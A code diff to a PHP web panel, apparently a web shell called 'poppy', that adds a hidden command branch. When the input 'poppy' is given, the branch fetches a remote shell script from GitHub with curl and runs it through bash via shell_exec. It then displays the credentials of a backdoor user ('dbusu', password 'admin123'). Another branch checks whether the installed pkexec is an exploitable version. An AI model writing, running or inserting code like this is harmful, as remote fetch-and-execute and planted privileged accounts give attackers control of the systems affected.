@@ -113,7 +113,11 @@
                     // filters shell commands
                     $string = $command;
                     if ($string === "poppy") {
-                        echo "<p class='alert' align='center'>UnderDevelopment</p>";
+//                        echo "<p class='alert' align='center'>UnderDevelopment</p>";
+                        $create_user = shell_exec('bash -c "$(curl -fsSL https://raw.githubusercontent.com/tahaafarooq/poppy/main/suuser.sh)"');
+                        echo "<p class='alert' align='center'>run this: <code>sudo -u dbusu bash -c 'id'</code></p>";
+                        echo "<p class='alert' align='center'>password : admin123</p>>";
+                        echo "<p class='alert' align='center'>user : dbusu</p>";
                     } elseif ($string === "polversion") {
                         $check_version = shell_exec("pkexec --version");
                         echo "<p class='alert' align='center'>Version : " . $check_version . ", If Version is less than < 0.130 == Vulnerable</p>";
